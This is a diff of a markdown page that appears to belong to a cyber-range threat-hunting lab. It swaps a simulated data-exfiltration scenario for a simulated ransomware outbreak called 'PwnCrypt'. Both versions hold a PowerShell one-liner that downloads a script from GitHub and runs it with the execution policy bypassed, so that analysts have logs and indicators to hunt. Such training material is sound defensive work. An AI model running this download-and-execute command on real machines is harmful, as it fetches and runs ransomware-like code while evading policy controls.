@@ -1,12 +1,20 @@
-# Threat Event (Suspected Exfiltration of Company Data)
+# Threat Event (Zero Day Ransomware PwnCrypt Outbreak)
 **Use of Powershell to run "Malicious" script**
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
 1. Execute the following code in Powershell:
-- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1`
+- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`
 
 ## What this script does:
-- `exfiltratedata.ps1` is a PowerShell script designed to simulate data exfiltration for cybersecurity training and testing. It demonstrates how sensitive files might be collected and transmitted by an attacker. Intended for use in controlled environments only.
+-This script performs two main actions:
+
+    Downloads a PowerShell script:
+    It uses Invoke-WebRequest to retrieve pwncrypt.ps1 from a GitHub URL and saves it to C:\programdata\pwncrypt.ps1.
+
+    Executes the downloaded script:
+    It then uses cmd to launch PowerShell with execution policy bypassed, running the downloaded pwncrypt.ps1 script.
+
+This allows the script to run without user confirmation or policy restrictions, simulating how a malicious payload might be delivered and executed during a cyberattack scenario.
 ---
 
 ## Tables Used to Detect IoCs:
